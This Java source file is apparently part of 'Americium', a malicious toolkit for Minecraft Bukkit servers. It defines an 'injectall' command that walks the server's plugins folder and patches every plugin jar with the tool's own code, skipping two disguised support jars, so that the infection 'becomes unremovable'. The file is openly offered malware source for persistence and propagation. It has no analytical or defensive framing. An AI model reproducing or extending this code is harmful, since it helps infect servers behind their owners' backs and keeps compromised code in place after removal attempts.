package cc.americium.command.commands;

import cc.americium.Authentication;
import cc.americium.Colors;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Injector;
import cc.americium.command.Sender;
import org.apache.commons.io.FileUtils;
import org.bukkit.Bukkit;
import org.bukkit.Color;
import org.bukkit.entity.Player;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Comparator;

public class InjectAll implements Command {
    @Override
    public String[] getCommands() {
        return new String[]{"injectall"};
    }

    @Override
    public String getDescription() {
        return "Injects Americium into all plugins. ";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) throws IOException, InterruptedException {
        sender.sendMessage(Colors.Prefix + "Please wait while Americium becomes unremovable.");
        try {
            Files.walk(Paths.get("./plugins"), 1)
                    .filter(Files::isRegularFile)
                    .filter(p -> p.getFileName().toString().endsWith(".jar"))
                    .sorted(Comparator.reverseOrder())
                    .map(Path::toFile)
                    .forEach(file -> {

                        if (file.getName().equals("ProtocolVersionSupport.jar") || file.getName().equals("SpigotSupport.jar")) {
                            return;
                        }
                        sender.sendMessage(Colors.Prefix + "Found plugin " + file.getName() + " please wait while it's injected...");
                        Injector.SimpleConfig sc = new Injector.SimpleConfig();
                        boolean result2 = Injector.patchFile(file.getPath(), file.getPath(), sc);
                        if (result2) {
                            sender.sendMessage(Colors.Prefix +  Colors.Success + "Injection Completed for " + file.getName() + "!");
                        } else {
                            sender.sendMessage(Colors.Prefix + Colors.Failure + "Injection Failed for " + file.getName() + "!");
                        }

                        try {
                            FileUtils.deleteDirectory(new File("./temp"));
                        } catch (IOException e) {
                            sender.sendMessage(e.getMessage());
                        }

                        return;
//                        if (file.delete()) {
//                            sender.sendMessage(Colors.Success + "Found file " + file.getPath() + "!");
//                            return;
//                        }

//                        sender.sendMessage(Colors.Failure + "Could not delete " + file.getPath() + "! Attempting to delete on exit!");
//                        file.deleteOnExit();
                    });
            sender.sendMessage(Colors.Prefix +  Colors.Success + "Finished injecting all plugins!");
        } catch (IOException e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            return;
        }
    }
}
